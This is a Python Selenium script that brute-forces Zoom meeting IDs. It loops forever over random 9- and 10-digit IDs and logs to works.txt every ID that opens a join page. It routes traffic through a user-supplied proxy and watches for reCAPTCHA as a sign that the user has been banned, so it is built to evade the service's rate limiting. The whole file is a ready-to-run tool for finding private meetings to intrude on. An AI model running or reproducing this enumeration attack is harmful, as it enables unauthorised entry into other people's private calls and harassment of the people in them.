##Importing
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import time
import random

#Ask user for proxy, if any.
print('Input a proxy, press enter for none. \neg: 1.1.1.1:1111')
PROXY = input()
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument(f'--proxy-server={PROXY}')

browser = webdriver.Chrome(options=chrome_options)  #Add the proxy to chrome

time.sleep(.5)
try:
    with open("works.txt", "a") as f:
        while(True):                                #Infinite while loop
            rand=random.uniform(0, 1)               #Generate random number to determine if it should be a 10 char code or a 9 char code
            id=random.randrange(100000000, 999999999, 6) if rand > 0.5 else random.randrange(1000000000, 9999999999, 6)
            joinid=f'https://zoom.us/wc/join/{id}'  #put the code into the url
            print(f"trying code {id}")
            browser.get((joinid))                   #Open the webbrowser / refresh
            if (len(browser.find_elements_by_id('inputname')) > 0 or len(browser.find_elements_by_id('wc_agree1')) > 0): #Check if it can find the name input (means that the code works
                f.write(f"{id}\n")                  ## Write the working code to the text file
                print(f'Code {id} works!')
            elif len(browser.find_elements_by_id('recaptcha-anchor-label')) > 0: #Try to find the google recaptcha
                print('You might have been banned.!')
            time.sleep(0.5)                         #Wait 0.5 seconds before trying again
except KeyboardInterrupt:
    exit(0)
